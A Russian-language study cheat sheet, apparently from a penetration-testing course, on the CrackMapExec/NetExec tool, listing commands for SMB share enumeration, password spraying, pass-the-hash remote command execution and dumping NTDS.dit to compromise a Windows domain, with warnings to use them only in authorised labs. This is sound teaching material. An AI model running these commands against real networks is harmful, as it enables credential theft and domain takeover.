# CrackMapExec


> [!important] Актуальное имя инструмента
> CrackMapExec больше не является поддерживаемой основной веткой. Его актуальный общественный преемник — **NetExec**, команда — `nxc`. Примеры ниже сохранены как историческая шпаргалка; для новых лабораторных работ используйте `nxc`.

## Актуальная установка и безопасная проверка

```bash
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
nxc --version
nxc --help
nxc smb --help
```

Синтаксис базовой проверки доступных SMB-ресурсов:

```bash
nxc smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' --shares
```

Не передавайте пароль прямо в командной строке на общей машине: он может попасть в историю shell и список процессов. Флаги удалённого исполнения и выгрузки NTDS применяются только в изолированном учебном домене с явным разрешением.

> [!warning] Разрешённая среда
> Исходный конспект сохранён. В рамках курса команды применяйте только к назначенной цели внешней учебной платформы и в пределах её правил; версии, зависимости и флаги сверяйте с первичной документацией.

Утилита, позволяющая выполнить проверку на доступность подключения к пользователям на windows машине.
## SMB
**Примеры:**
Прочитать доступные службы:
```
nxc smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' --shares
```
Аутентифицироваться по hash-у:
```
nxc smb <TARGET_IP> -u '<USER>' -H '<NT_HASH>' -x '<COMMAND>'
```
**Флаги:**
`-u` - username
`-p` - password
`-H` - password's hash
`-x` - исполнить команду
`--ntds` - дамп файла "**`ntds.dit`**". (А значит службы **NTDS**).

`-L` - посмотреть доступные модули
`-M {name}` - включить модуль
>вывод попадает в /tmp/{module name}/{IP}.json
>spider_plus - лист файлов и директорий

`--share {name}` - узнать конкретную службу, например DOCS
`--users` -  перечислить домены с юзерами

`--continue-on-success` - отвечает за то, чтобы процесс не прервался после нахождения валидной пары. Полезный флаг для **Password Spraying** атаки.
`--local-auth` - отвечает за прохождение аутентификации локально (не доменная учетная запись).
`--no-bruteforce` - отвечает за установление соответствия между пользователем и паролем, таким образом можно легко найти валидные учетные данные из большого списка, когда одному пользователю принадлежит только один определенный пароль.

### Дамб NTDS
Дамп NTDS.dit, тем самым полностью скомпрометировать домен:
```
nxc smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' --ntds
```
